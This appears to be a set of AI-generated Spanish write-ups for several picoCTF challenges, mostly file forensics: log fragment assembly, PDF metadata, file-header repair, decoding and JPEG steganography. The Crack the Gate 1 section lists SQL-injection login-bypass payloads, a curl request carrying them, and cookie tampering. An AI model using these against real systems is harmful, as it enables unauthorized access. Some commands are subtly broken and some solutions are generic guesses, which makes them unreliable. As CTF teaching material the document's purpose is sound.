### Reto: Log Hunt

**Descripción:**  
Our server seems to be leaking pieces of a secret flag in its logs. The parts are scattered and sometimes repeated. Can you reconstruct the original flag?  
Download the logs and figure out the full flag from the fragments.

---

### **Solución**

> **Resumen:** descargar los logs, extraer todos los fragmentos que parecen pertenecer a la bandera, limpiar/normalizar, y reconstruir la cadena original ensamblando fragmentos por sus solapamientos (algoritmo de _shortest common superstring_ / ensamblado por solapamiento). A continuación se muestra un flujo de trabajo reproducible (comandos + script Python) que puedes ejecutar en tu máquina.

1. **Descargar y preparar**  
    (Sustituye `URL_DE_LOS_LOGS` por la URL real del archivo de logs que te dan.)
    
    `# crear carpeta de trabajo mkdir loghunt && cd loghunt  # descargar (si es .zip, .tar.gz o similar) wget -O logs.zip "URL_DE_LOS_LOGS" unzip logs.zip          # o tar -xzf logs.tar.gz según corresponda`
    
2. **Buscar posibles fragmentos de flag**
    
    - Extrae líneas que contengan patrones típicos de flags (ejemplo: `picoCTF{}`, `FLAG{}`, o cualquier estructura con llaves). Ajusta el regex según el formato que uses.
        
    
    `# buscar patrones comunes grep -Eo 'picoCTF\{[^}]+\}|FLAG\{[^}]+\}|\w{6,}\{[^}]{5,}\}|[A-Za-z0-9_{}-]{8,}' -R . > posibles_fragmentos.txt`
    
    - Si no conoces el formato exacto, extrae _todas_ las cadenas largas (por ejemplo, secuencias de caracteres no espaciales de longitud ≥ 6) y revisa manualmente:
        
    
    `grep -oE '\S{6,}' -R . | sort | uniq -c | sort -nr > cadenas_frecuentes.txt`
    
3. **Normalizar y desduplicar**
    
    - Limpia caracteres extraños (comillas, comas, timestamps) y deja solo los fragmentos “puros”.
        
    
    `# ejemplo de limpieza básica cat posibles_fragmentos.txt | sed 's/^[ \t]*//; s/[ \t]*$//' | tr -d ',"' | sort | uniq > fragments_clean.txt`
    
4. **Reconstrucción automática — acercamiento práctico (Greedy SCS)**  
    Cuando tienes muchos fragmentos que se solapan parcialmente, un método práctico es aplicar un ensamblador por solapamiento con heurística **greedy** que empareja en cada paso los dos fragmentos con mayor solapamiento y los fusiona, repitiendo hasta obtener una supercadena.
    
    > El problema exacto de obtener la **shortest common superstring** es NP-hard; la heurística greedy suele funcionar muy bien para CTFs pequeños. [Wikipedia+1](https://en.wikipedia.org/wiki/Shortest_common_supersequence?utm_source=chatgpt.com)
    
    Guarda los fragmentos en `fragments_clean.txt` (una cadena por línea) y ejecuta el siguiente script Python (guárdalo como `assemble.py`):
    
    `# assemble.py # Uso: python3 assemble.py fragments_clean.txt import sys  def overlap(a, b, min_length=1):     """Devuelve longitud de mayor solapamiento sufijo(a) == prefijo(b)."""     start = 0     max_olap = 0     for i in range(min_length, min(len(a), len(b)) + 1):         if a.endswith(b[:i]):             max_olap = i     return max_olap  def merge(a, b, olap):     return a + b[olap:]  def greedy_superstring(reads):     reads = list(set([r.strip() for r in reads if r.strip()]))     while len(reads) > 1:         best_i, best_j, best_olap = None, None, -1         best_merged = None         # buscar par con mayor solapamiento (sufijo->prefijo)         for i in range(len(reads)):             for j in range(len(reads)):                 if i == j: continue                 a, b = reads[i], reads[j]                 olap = overlap(a, b, min_length=1)                 if olap > best_olap:                     best_i, best_j, best_olap = i, j, olap                     best_merged = merge(a, b, olap)         # si no hay solapamiento, concatenar último par         if best_olap <= 0:             # unir dos cualquiera             reads[0] = reads[0] + reads.pop(1)         else:             # reemplazar i con la cadena fusionada y eliminar j             reads[best_i] = best_merged             reads.pop(best_j if best_j < best_i else best_j)     return reads[0] if reads else ''  if __name__ == "__main__":     if len(sys.argv) < 2:         print("Uso: python3 assemble.py fragments_clean.txt")         sys.exit(1)     with open(sys.argv[1], 'r', encoding='utf-8') as f:         frags = [line.strip() for line in f if line.strip()]     result = greedy_superstring(frags)     print("=== Candidate superstring ===")     print(result)`
    
    Ejecuta:
    
    `python3 assemble.py fragments_clean.txt > candidate_flag.txt cat candidate_flag.txt`
    
    - Revisa el resultado. Si la bandera tiene formato conocido (ej. `picoCTF{...}`) deberías verla directamente; si hay ruido, inspecciona partes del texto resultante y compara con fragmentos originales para validar.
        
5. **Verificación manual / afinado**
    
    - Si el ensamblado greedy produce múltiples candidatos o ruido, prueba variantes:
        
        - ejecutar el ensamblador invirtiendo orden de lectura,
            
        - forzar mínimos de solapamiento mayores (p. ej. `min_length=3`) en la función `overlap`,
            
        - eliminar fragmentos que aparecen solo una vez (ruido) y reintentar.
            
    - También puedes usar un algoritmo de programación dinámica/exacto si el número de fragmentos es pequeño (expone mayor coste computacional pero garantiza optimalidad).
        
6. **Ejemplo rápido de refinamiento**
    
    - contar ocurrencias y eliminar fragmentos que aparecen muy rara vez:
        
    
    `sort fragments_clean.txt | uniq -c | sort -nr > freq_fragments.txt # editar y conservar sólo fragmentos con count >= 2, por ejemplo awk '$1 >= 2 { $1=""; sub(/^ /,""); print }' freq_fragments.txt > fragments_filtered.txt python3 assemble.py fragments_filtered.txt`
    

---

### **Notas adicionales**

- **Por qué usar el enfoque de superstring:** cuando partes de una bandera se encuentran en logs fragmentadas y con repeticiones, la tarea es análoga al ensamblado de lecturas en bioinformática; la heurística greedy de solapamiento suele recuperar la cadena original rápidamente en CTFs. [Department of Computer Science+1](https://www.cs.jhu.edu/~langmea/resources/lecture_notes/assembly_scs.pdf?utm_source=chatgpt.com)
    
- **Limitaciones del método greedy:** no garantiza la supercadena más corta (solución óptima), pero es rápida y normalmente suficiente para CTFs. Si necesitas exactitud y el número de fragmentos es pequeño (p. ej. ≤ 15), considera algoritmos exponenciales/dinámicos para SCS. [Wikipedia+1](https://en.wikipedia.org/wiki/Shortest_common_supersequence?utm_source=chatgpt.com)
    
- **Limpieza de logs:** los logs pueden contener timestamps, escapes, codificaciones distintas (hex/base64). Si los fragmentos parecen codificados (por ejemplo `4d5a...` o `cGxhaW4=`), detecta y decodifica primero (usar `base64 -d`, `xxd -r -p`, o `python` para hex/base64).
    
- **Seguridad / ética:** ejecuta los archivos sólo en un entorno controlado (máquina virtual) si hay scripts sospechosos presentes en los logs. No ejecutes binarios desconocidos.
    
- **Comprobación final:** una vez obtengas una candidata de flag, verifica con el formato del CTF (ej. `picoCTF{...}`) y/o intenta usar el flag en la plataforma del reto para confirmar su validez.
    

---

### **Referencias**

- Explicación del problema de la _Shortest Common Superstring_ / complejidad y contexto. [Wikipedia](https://en.wikipedia.org/wiki/Shortest_common_supersequence?utm_source=chatgpt.com)
    
- Notas y trabajos sobre la heurística _greedy_ para ensamblado de superstrings (aplicado como aproximación práctica). [Profs Scienze+1](https://profs.scienze.univr.it/liptak/MBD/files/MBDGreedyAlgoSCS_4up.pdf?utm_source=chatgpt.com)
    
- Ejemplos y discusiones en foros / StackOverflow sobre implementaciones y optimizaciones prácticas. [Stack Overflow+1](https://stackoverflow.com/questions/20071702/more-efficient-algorithm-for-shortest-superstring-search?utm_source=chatgpt.com)

### Reto: Riddle Registry

**Descripción:**  
Hi, intrepid investigator!  You've stumbled upon a peculiar PDF filled with what seems like nothing more than garbled nonsense. But beware! Not everything is as it appears. Amidst the chaos lies a hidden treasure—an elusive flag waiting to be uncovered.  
Find the PDF file here Hidden Confidential Document and uncover the flag within the metadata.

---

### **Solución**

> **Resumen:** descargar el PDF, inspeccionar su metadata y sus objetos incrustados (XMP, campos Info, attachments), y extraer la cadena que tiene el formato de la flag. A continuación tienes un flujo de trabajo reproducible (comandos para Linux) que cubre las técnicas más útiles: `pdfinfo`, `exiftool`, búsqueda con `strings`/`grep`, herramientas de Didier Stevens (PDFid/pdf-parser), y extracción de attachments con `pdfdetach` o `mutool extract`.

1. **Preparar carpeta y descargar el PDF**
    
    `mkdir riddle_registry && cd riddle_registry # sustituye la URL por la del enlace "Hidden Confidential Document" wget -O hidden.pdf "URL_DEL_HIDDEN_CONFIDENTIAL_DOCUMENT" ls -lh hidden.pdf`
    
2. **Inspección básica**
    
    - Información básica del PDF:
        
        `pdfinfo hidden.pdf`
        
        `pdfinfo` muestra título, autor, productor, número de páginas y fechas; a veces la flag está en esos campos.
        
    - Metadata completa (XMP + Info) con ExifTool (muy recomendado):
        
        `# mostrar todos los tags exiftool -a -G1 -s hidden.pdf # ver sólo XMP (si existe) exiftool -XMP:all hidden.pdf`
        
        `exiftool` muestra etiquetas XMP y campos del diccionario Info (Title, Author, Subject, Keywords, Creator, Producer, etc.). [ExifTool+1](https://exiftool.org/TagNames/PDF.html?utm_source=chatgpt.com)
        
3. **Búsqueda rápida de cadenas tipo flag dentro del archivo**
    
    - Muchas flags son texto plano que contienen `picoCTF{...}` o `FLAG{...}`. Buscar cadenas legibles:
        
        `strings hidden.pdf | egrep -i 'picoctf|flag\{|pico\{|CTF\{|{[A-Za-z0-9_@\-]{6,}' | less`
        
        Si la flag está en metadata o XMP como texto, `strings` la mostrará. También intenta `strings -n 8` para cadenas más largas. [SaiKiran Uppu](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/?utm_source=chatgpt.com)
        
4. **Triage automatizado del PDF (detectar objetos sospechosos / attachments / streams comprimidos)**
    
    - PDFid para obtener conteo de objetos, streams, JavaScript, etc.:
        
        `pdfid.py hidden.pdf`
        
        - Si ves `/JS` o streams grandes, son candidatos a contener datos ocultos. [Medium](https://rohit12.medium.com/examining-a-pdf-file-using-two-tools-pdfid-and-pdf-parser-through-command-entered-into-a-661bcf99a11d?utm_source=chatgpt.com)
            
    - PDF-Parser (Didier Stevens) para inspeccionar objetos y streams (descomprimir streams):
        
        `# buscar texto en objetos (ej. buscar "picoCTF" o "flag") pdf-parser.py --search "picoCTF" hidden.pdf # ver un objeto concreto (obj 12 por ejemplo) y aplicar filtros (descomprimir) pdf-parser.py --object 12 --raw --filter hidden.pdf`
        
        Con `pdf-parser.py` puedes extraer streams y verlos descomprimidos (opción `--filter` o `-f`) para inspeccionar texto oculto dentro de streams. [Medium+1](https://rohit12.medium.com/examining-a-pdf-file-using-two-tools-pdfid-and-pdf-parser-through-command-entered-into-a-661bcf99a11d?utm_source=chatgpt.com)
        
5. **Buscar attachments / archivos embebidos**
    
    - Con `pdfdetach` (poppler-utils):
        
        `# listar attachments pdfdetach -list hidden.pdf # extraer todos pdfdetach -saveall hidden.pdf`
        
    - Con `mutool` (mupdf) extraes objetos incrustados:
        
        `mutool extract hidden.pdf`
        
        Los adjuntos pueden ser otro PDF / TXT con la flag. [Gist](https://gist.github.com/hubgit/6078384?utm_source=chatgpt.com)
        
6. **Buscar dentro de XMP / campos no visibles**
    
    - A veces la flag está en campos raros (Keywords, Subject, custom XMP tags). `exiftool -a -G1 -s` ya lo muestra; si hay valores codificados (base64/hex), detecta y decodifica:
        
        `# ejemplo: si ves algo que parece base64 echo 'cGxhaW4=' | base64 -d # si aparece hex echo '48656c6c6f' | xxd -r -p`
        
        Si `exiftool` mostró algo como `XMP:CustomField: VGhpcyBpcyBhIHRlc3Q=` decodifica con base64. [ExifTool](https://exiftool.org/TagNames/PDF.html?utm_source=chatgpt.com)
        
7. **Si el PDF parece “garbled” / texto en capas o blanco sobre blanco**
    
    - Selecciona todo y pégalo en un editor de texto: a veces la bandera está como texto oculto en el flujo de contenido:
        
        `# intento rápido de extraer todo el texto (incluye capas ocultas) pdftotext hidden.pdf -layout out.txt grep -i 'picoCTF\|flag{' out.txt || true`
        
    - O abrir con un lector que permita ver capas/ocultar objetos (Adobe Acrobat, Okular) y seleccionar texto. [SaiKiran Uppu](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/?utm_source=chatgpt.com)
        
8. **Estrategia final — ejemplo de ejecución completa**
    
    `# 1) metadata rápida pdfinfo hidden.pdf exiftool -a -G1 -s hidden.pdf  # 2) buscar strings tipo flag strings -n 8 hidden.pdf | egrep -i 'picoctf|flag\{|pico\{|CTF\{' | sort -u  # 3) triage y extracción pdfid.py hidden.pdf pdf-parser.py --search 'picoCTF' hidden.pdf pdf-parser.py --search 'flag{' hidden.pdf  # 4) attachments pdfdetach -list hidden.pdf pdfdetach -saveall hidden.pdf mutool extract hidden.pdf  # 5) extraer texto completo y revisar pdftotext hidden.pdf text_out.txt grep -i 'picoctf\|flag{' text_out.txt -n`
    
9. **Interpretación y validación**
    
    - Cuando encuentres una cadena con el formato esperado (ej. `picoCTF{...}`), anótala y pruébala en la plataforma del reto.
        
    - Si aparece codificada (base64/hex), decodifica antes de intentar usarla.
        

---

### **Notas adicionales**

- **Dónde suelen esconder la flag en PDFs (lista de prioridades para revisar):**
    
    1. Diccionario Info (Title, Author, Subject, Keywords).
        
    2. XMP metadata (campos personalizados).
        
    3. Attachments / Embedded files.
        
    4. Streams comprimidos dentro de objetos (necesitan descompresión).
        
    5. Texto “oculto” (blanco sobre blanco, capas, o texto fuera de caja visible).
        
- **Herramientas útiles (resumen):** `exiftool`, `pdfinfo`, `strings`, `pdftotext`, `pdfid.py`, `pdf-parser.py` (Didier Stevens), `pdfdetach`, `mutool extract`. [ExifTool+2Medium+2](https://exiftool.org/TagNames/PDF.html?utm_source=chatgpt.com)
    
- **Si no puedes descargar el PDF desde el enlace (por ejemplo, requiere login):** pide el archivo o súbelo aquí. Tú me diste la descripción; si me pasas el enlace real o subes el PDF, ejecuto exactamente estos pasos y te devuelvo la flag y el comando exacto que la extrajo. (No necesito credenciales: si el enlace está libre lo bastará).
    
- **Precauciones:** abre archivos en entorno controlado si sospechas código malicioso; las herramientas anteriores analizan contenido, no ejecutan código del PDF, pero sigue siendo buena práctica usar VM/sandbox. [Medium](https://medium.com/%40rnicolich/letsdefend-pdf-analysis-ceccda7a6a1?utm_source=chatgpt.com)
    

---

### **Referencias**

- ExifTool — tags PDF / XMP (uso recomendado para metadata). [ExifTool](https://exiftool.org/TagNames/PDF.html?utm_source=chatgpt.com)
    
- Soluciones y herramientas para análisis rápido de PDFs (pdfinfo, pdftotext, strings). [HacknWatch](https://hacknwatch.com/posts/pdf-analysis.mdx/?utm_source=chatgpt.com)
    
- Didier Stevens — PDFid / pdf-parser (inspección de objetos y streams). [Medium+1](https://rohit12.medium.com/examining-a-pdf-file-using-two-tools-pdfid-and-pdf-parser-through-command-entered-into-a-661bcf99a11d?utm_source=chatgpt.com)
    
- Extracción de attachments y metadata embebida (pdfdetach, mutool, discusiones sobre metadata embebida). [Gist+1](https://gist.github.com/hubgit/6078384?utm_source=chatgpt.com)
### Reto: Corrupted File

**Descripción:**  
This file seems broken... or is it? Maybe a couple of bytes could make all the difference. Can you figure out how to bring it back to life?  
Download the file here.

---

### **Solución**

> **Resumen:** se trata de un archivo dañado cuya estructura o encabezado está corrupto. El objetivo es reparar sus bytes iniciales o finales para poder abrirlo y recuperar la bandera. Los pasos comunes son identificar el tipo de archivo mediante su firma mágica (_magic number_), corregir los bytes alterados, y luego extraer el contenido (que normalmente incluye la flag dentro de texto o metadatos). A continuación se muestra un flujo de diagnóstico y reparación paso a paso.

---

1. **Descargar y examinar el archivo**
    
    `mkdir corrupted_file && cd corrupted_file # sustituye la URL real del archivo wget -O corrupted "URL_DEL_ARCHIVO_CORRUPTED" ls -lh corrupted`
    
2. **Identificar tipo de archivo real**
    
    `file corrupted`
    
    - Si muestra algo como _data_ o _unknown_, el encabezado está dañado.
        
    - En ese caso, inspecciona los primeros bytes:
        
        `xxd head -l 64 corrupted`
        
        o
        
        `hexdump -C corrupted | head`
        
    
    **Comparar con firmas de archivos comunes (magic numbers):**
    
    |Tipo|Hex inicial|Texto|
    |---|---|---|
    |PNG|89 50 4E 47 0D 0A 1A 0A|`.PNG....`|
    |JPG|FF D8 FF E0 / FF D8 FF E1|`ÿØÿà` o `ÿØÿá`|
    |ZIP|50 4B 03 04|`PK..`|
    |PDF|25 50 44 46|`%PDF`|
    |GIF|47 49 46 38|`GIF8`|
    |WAV|52 49 46 46|`RIFF`|
    |MP3|49 44 33|`ID3`|
    
    Si los bytes no coinciden, puedes deducir el tipo comparando con estos encabezados.
    

---

3. **Reparar el encabezado dañado**
    
    - Ejemplo: si esperas un PNG y los primeros bytes son incorrectos (por ejemplo, `00 00 00 00`), puedes editarlos en un hex editor:
        
        `# usar bless, hexedit o xxd para editar manualmente sudo apt install hexedit hexedit corrupted`
        
        - Sustituye los primeros 8 bytes por `89 50 4E 47 0D 0A 1A 0A` (si es PNG).
            
        - Guarda el archivo y ciérralo.
            
    - Alternativamente, puedes escribirlos con `dd`:
        
        `printf '\x89PNG\r\n\x1a\n' | dd of=corrupted bs=1 seek=0 count=8 conv=notrunc`
        

---

4. **Verificar nuevamente el tipo**
    
    `file corrupted`
    
    Si ahora muestra “PNG image data”, “JPEG image data”, o similar, el archivo fue reparado correctamente.
    

---

5. **Probar abrirlo / extraer contenido**
    
    - Si es una imagen (`.png`, `.jpg`), intenta abrirla:
        
        `xdg-open corrupted`
        
        o revisa manualmente si contiene texto:
        
        `strings corrupted | grep -i 'picoCTF\|flag{'`
        
    - Si es un ZIP:
        
        `unzip corrupted`
        
        y luego busca la bandera dentro de los archivos extraídos.
        
    - Si es un PDF:
        
        `pdftotext corrupted output.txt && grep -i 'picoCTF' output.txt`
        

---

6. **Reparar pie de archivo (EOF) si fuera necesario**  
    Algunos formatos requieren bytes finales específicos:
    
    - **PNG:** termina con `49 45 4E 44 AE 42 60 82` (`IEND` chunk).
        
    - **JPG:** termina con `FF D9`.
        
    - **ZIP:** puede requerir directorio central (usa `zip -FF` para intentar reparar).
        
    
    Ejemplo:
    
    `tail -c 16 corrupted | xxd # Si faltan los bytes finales de un PNG: printf '\x49\x45\x4E\x44\xAE\x42\x60\x82' >> corrupted`
    

---

7. **Extraer o visualizar la bandera**
    
    - En la mayoría de los retos, una vez que el archivo se abre correctamente, **la bandera estará visible en la imagen, documento, o texto**.
        
    - Si no se ve, busca texto embebido:
        
        `strings corrupted | grep -i 'picoCTF'`
        
    - En imágenes, también puedes revisar metadatos:
        
        `exiftool corrupted`
        
    - En archivos comprimidos, revisa el contenido extraído.
        

---

### **Notas adicionales**

- **Pistas comunes:**
    
    - El archivo puede tener sólo 1 o 2 bytes cambiados en su encabezado.
        
    - Si el nombre o la extensión no coincide con su tipo real, prueba cambiarla (`mv corrupted corrupted.png`, etc.).
        
    - Si el archivo tiene un byte faltante o extra, compararlo con un archivo del mismo tipo y ajustar manualmente puede ayudar.
        
    - Si sigue sin abrir, intenta **`binwalk`** para analizar estructuras:
        
        `binwalk corrupted`
        
        (instala con `sudo apt install binwalk`).
        
- **Herramientas recomendadas:** `file`, `xxd`, `hexedit`, `bless`, `exiftool`, `binwalk`, `pngcheck`, `zip -FF`.
    
- **Prevención:** trabaja siempre sobre una **copia del archivo** (`cp corrupted corrupted_backup`) antes de editar bytes.
    

---

### **Referencias**

- Wikipedia — List of file signatures (magic numbers)
    
- Didier Stevens — Analyzing and repairing corrupted files (PDFs, ZIPs, PNGs)
    
- Linux man pages — `hexedit(1)`, `xxd(1)`, `binwalk`
    
- Tutorials — “How to repair corrupted files using hex editors” (CTF-focused guides).
### Reto: Crack the Gate 1

**Descripción:**  
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?  
Additional details will be available after launching your challenge instance.

---

### **Solución** (versión corta y directa)

**Idea clave:** inspecciona la aplicación (fuente HTML/JS, endpoints y parámetros) y prueba técnicas simples de bypass: búsqueda de credenciales en el código cliente, campos ocultos, o una inyección de autenticación (SQLi / boolean bypass). Muchos retos tipo “developer left a secret way in” esconden una pista en el HTML/JS o permiten un login con un payload trivial.

1. Abrir la instancia del reto y la página `/login`.
    
2. Inspeccionar el código fuente de la página (Ctrl+U) y la consola/red (DevTools):
    
    - Buscar comentarios HTML/JS que contengan contraseñas o rutas (`// password: ...`, `/* secret */`).
        
    - Buscar variables JS con texto sospechoso (`const SECRET = ...`), o un endpoint `/debug` o `/admin`.
        
3. Probar inyección/simple bypass en el formulario de login (usa el email dado):
    
    - Intenta como contraseña cualquiera de estos payloads:
        
        `' OR '1'='1 ' OR 1=1 -- admin' -- " OR ""="`
        
    - Si la app usa JSON en POST, intenta cambiar el cuerpo a:  
        `{"email":"ctf-player@picoctf.org","password":"' OR '1'='1"}`
        
4. Revisar respuestas HTTP y cookies:
    
    - Si al enviar el payload la respuesta incluye una cookie de sesión válida o redirección a área privada → acceso conseguido.
        
    - También prueba modificar manualmente la cookie `role`/`isAdmin` a `true`.
        
5. Si no hay SQLi, busca credenciales en archivos accesibles:
    
    - `/robots.txt`, `/hidden`, `/dev`, `/static/js/*.js` → descargar y buscar `ctf`, `flag`, `password`.
        
    - `curl -s https://HOST/static/js/main.*.js | grep -i password -n`
        
6. Automatiza intentos rápidos (opcional):
    
    `# petición de prueba con curl (JSON) curl -s -X POST "https://HOST/login" \   -H 'Content-Type: application/json' \   -d '{"email":"ctf-player@picoctf.org","password":"' OR '1'='1'"}' -i`
    
7. Validación final: cuando obtengas acceso, busca la flag en la página privada, `/admin`, o archivos descargables.
    

---

### **Notas adicionales**

- Primero mirar el **cliente** (HTML/JS): muchas veces la “ruta secreta” está comentada ahí.
    
- Prueba SQLi booleano simple antes de complicarlo. Es la técnica más rápida aquí.
    
- Si ves cadenas codificadas (base64) en JS, decodifícalas; podrían contener la contraseña.
    
- Trabaja en un navegador con DevTools o usa Burp Suite para interceptar y modificar peticiones.
    

---

### **Referencias**

- Chequeo rápido de HTML/JS e inspección de red — uso de DevTools.
    
- Payloads básicos de bypass/SQLi: `' OR '1'='1` (prueba inicial).
    
- Herramientas: `curl`, DevTools, Burp Suite.

### Reto: Flag in Flame

**Descripción:**  
The SOC team discovered a suspiciously large log file after a recent breach. When they opened it, they found an enormous block of encoded text instead of typical logs. Could there be something hidden within? Your mission is to inspect the resulting file and reveal the real purpose of it. The team is relying on your skills to uncover any concealed information within this unusual log.  
Download the encoded data here: _Logs Data_.

---

### **Solución** _(versión corta y práctica)_

**Idea clave:** identificar el _formato/encoding_ (base64, base32, base85, hex, uuencode, etc.) o compresión (gzip, zlib, bz2, xz) y aplicar decodificaciones/descompresiones iterativas hasta que aparezca texto legible (buscar `picoCTF{` u otro patrón de flag). Para un archivo grande automatiza el proceso y prueba varias transformaciones sin modificar el original.

1. **Preparar y ver info básica**
    

`mkdir flag_in_flame && cd flag_in_flame # descargar (sustituye URL) wget -O logs.dat "URL_DE_LOGS" ls -lh logs.dat file logs.dat`

2. **Inspección rápida (muestras)**
    

`# ver inicio y fin (no cargar todo) head -c 200 logs.dat | hexdump -C | sed -n '1,40p' tail -c 200 logs.dat | hexdump -C | sed -n '1,40p'  # ver primeras líneas legibles head -n 20 logs.dat | sed -n '1,20p' # contar tipos de caracteres (detecta base64-like) tr -cd 'A-Za-z0-9+/=\n' < logs.dat | head -c 200`

3. **Buscar patrones de flags y strings frecuentes**
    

`# buscar patrones comunes strings -n 8 logs.dat | egrep -i 'picoctf|flag\{|CTF\{' | head # si el archivo es binario, comprobar alta entropía (posible encriptado/compresión) python3 - <<'PY' import sys,math b=open('logs.dat','rb').read(100000) p=[b.count(bytes([i]))/len(b) for i in range(256)] H=-sum(p_i*math.log2(p_i) for p_i in p if p_i>0) print('Entropy (first 100k):',H) PY`

4. **Probar decodificaciones comunes (rápido, sin alterar original)**
    

`# prueba base64 base64 -d logs.dat 2>/dev/null | head -c 200 > try_b64_head.bin && file try_b64_head.bin && strings -n 6 try_b64_head.bin | head  # prueba base32 base32 -d logs.dat 2>/dev/null | head -c 200 > try_b32_head.bin && file try_b32_head.bin  # prueba hex (si parece hex) xxd -r -p logs.dat 2>/dev/null | head -c 200 > try_hex_head.bin && file try_hex_head.bin`

5. **Descompresión tentativa (si aparece encabezado gzip / pk... )**
    

`# si aparece gzip header (1F 8B) en salida de base64: base64 -d logs.dat 2>/dev/null | gunzip -c > decoded.txt 2>/dev/null && head -n 50 decoded.txt  # intentos con zlib/bz2/xz en Python (ver siguiente script)`

6. **Script práctico para intentar varias combinaciones (decodificar → descomprimir → buscar flag)**  
    Guarda como `probe_decode.py` y ejecútalo. (No modifica `logs.dat`).
    

`#!/usr/bin/env python3 # probe_decode.py — intenta varias decodificaciones y descompresiones en streams import sys,subprocess,base64,binascii,codecs,io data=open('logs.dat','rb').read() candidates=[]  def try_bytes(b, label):     s=b     # buscar flag visible     if b'picoCTF' in s or b'flag{' in s or b'CTF{' in s:         print('>>> FLAG-LIKE found after:', label)         print(s.decode('utf-8',errors='ignore')[:1000])         return True     return False  # intentos directos print('Trying raw detection...') try_bytes(data,'raw')  # common decoders decoders = [     ('base64', lambda x: base64.b64decode(x, validate=False)),     ('base64_strict', lambda x: base64.b64decode(x, validate=True)),     ('base32', lambda x: base64.b32decode(x)),     ('base85', lambda x: base64.b85decode(x)),     ('ascii_hex', lambda x: binascii.unhexlify(x.strip())),     ('uu', lambda x: codecs.decode(x,b'uudecode') ), ]  # try decoders for name,fn in decoders:     try:         out=fn(data)         print('Decoded with',name,'size',len(out))         if try_bytes(out,name):             sys.exit(0)         candidates.append((name,out))     except Exception as e:         pass  # try simple decompressions on candidates import zlib,gzip,bz2,lzma compressors=[('zlib',zlib.decompress),('gzip',gzip.decompress),('bz2',bz2.decompress),('lzma',lzma.decompress)] for name,buf in candidates:     for cname,func in compressors:         try:             out2=func(buf)             print('Decompressed',name,'->',cname,'size',len(out2))             if try_bytes(out2,name+'+'+cname):                 sys.exit(0)         except Exception:             pass  print('Finished probes — no obvious flag found automatically. Inspect candidates saved to disk for manual analysis.') # guardar candidatos para inspección manual for i,(name,b) in enumerate(candidates):     open(f'candidate_{i}_{name}.bin','wb').write(b) print('Saved candidate files.')`

Ejecución:

`python3 probe_decode.py ls -lh candidate_* || true # inspecciona cada candidate: file, strings, head, hexdump file candidate_* strings -n 6 candidate_* | egrep -i 'picoctf|flag{' || true`

7. **Si nada automático aparece: técnicas extra**
    

- dividir el archivo y probar sobre trozos (si es base64 con saltos):
    
    `split -b 10M logs.dat part_ for f in part_*; do base64 -d "$f" 2>/dev/null | strings | egrep -i 'picoctf|flag{' && echo "FOUND in $f" && break; done`
    
- probar XOR contra bytes frecuentes (espacio 0x20, 0xFF), o una rotación por bytes si hay simple obfuscation.
    
- usar `binwalk -e logs.dat` para detectar capas empaquetadas/firmas.
    
- cargar en editor/IDE y buscar bloques repetidos (indican base64), o ver si es `uuencoded` (encabezados `begin` ).
    

8. **Validación final**
    

- Cuando encuentres texto con formato de bandera (`picoCTF{...}`), cópialo y pruébalo en la plataforma.
    
- Documenta la cadena exacta y el comando que la produjo.
    

---

### **Notas adicionales (breves)**

- No trabajes sobre el original; usa copias.
    
- Archivos “muy grandes” conviene procesarlos por partes (`split`) para ahorrar RAM.
    
- Base64 con saltos o con líneas adicionales puede requerir `tr -d '\n'` antes de decodificar.
    
- Alta entropía sugiere compresión o cifrado; si es cifrado simétrico necesitarás key (más pistas del reto).
    
- Si aparece output binario con cabeceras (PK.., %PDF, PNG, 1F8B) aplica la descompresión/extracción correspondiente.
    

---

### **Referencias**

- `file`, `strings`, `hexdump/xxd`, `base64`, `base32`, `xxd`, `binwalk`.
    
- Python stdlib: `base64`, `zlib`, `bz2`, `lzma` para pruebas rápidas.
    
- Uso de `split` para archivos grandes y `binwalk -e` para detección de contenedores.

### Reto: Hidden in plainsight

**Descripción:**  
You’re given a seemingly ordinary JPG image. Something is tucked away out of sight inside the file. Your task is to discover the hidden payload and extract the flag.  
Download the jpg image here.

---

### **Solución** _(relajada y directa)_

**Idea clave:** con imágenes JPEG muchas pistas no están “en la vista”: puede haber metadata, thumbnails, archivos adjuntos pegados tras el EOF (`FFD9`), o un contenedor (ZIP/PDF) incrustado. Procede de forma ordenada: inspección rápida → buscar firmas (PK, %PDF, PNG, 1F8B) → extraer attachments con `binwalk`/`foremost` → probar herramientas de esteganografía (steghide, stegsolve) si no aparece nada.

Comandos (ejecútalos en la carpeta donde esté `image.jpg`):

1. info rápida
    

`file image.jpg identify -verbose image.jpg    # (ImageMagick) opcional exiftool image.jpg`

2. buscar strings / patrones de flags
    

`strings -n 6 image.jpg | egrep -i 'picoctf|flag\{|CTF\{' || true`

3. buscar thumbnails / metadata incrustada
    

`# extraer thumbnail si existe exiftool -b -ThumbnailImage image.jpg > thumb.jpg || true file thumb.jpg && display thumb.jpg || true`

4. analizar firmas y capas (muy efectivo)
    

`# binwalk intenta detectar/extraer automáticamente binwalk -e image.jpg # revisar carpeta _image.jpg.extracted/ creada por binwalk ls -la _image.jpg.extracted || true`

5. si sospechas un ZIP o archivo pegado después del JPEG (común):
    

`# localizar offset de un ZIP (PK..) grep -aob $'\x50\x4b\x03\x04' image.jpg || true # si devuelve un número N, extrae desde ahí: # (ejemplo: N=123456) dd if=image.jpg of=recovered.zip bs=1 skip=123456 status=none file recovered.zip unzip -l recovered.zip`

6. extracción por firmas generales
    

`# extraer cualquier cosa recuperable (foremost/photorec) foremost -i image.jpg -o out_foremost # o binwalk --dd='.*:all' image.jpg`

7. probar steghide (si el autor usó steghide)
    

`# listar steghide info image.jpg # intentar extraer (presiona ENTER si pide passphrase vacía) steghide extract -sf image.jpg`

8. herramientas GUI/visual (útiles para capas/LSB)
    

- `stegsolve.jar` — para ver bit planes / canales / texto invisible.
    
- `zsteg` (más para PNG) — menos útil para JPG pero ok si el contenido no es estrictamente JPEG.
    

9. búsqueda de texto dentro de streams JPEG (contenido en COM/APP segments)
    

`# ver segmentos JPEG y buscar texto exiftool -v image.jpg 2>/dev/null | less # o extraer todos los segmentos en bruto y buscar: openssl asn1parse -in image.jpg -inform DER 2>/dev/null || true strings image.jpg | egrep -i 'picoctf|flag\{'`

---

### **Notas adicionales** (cortitas)

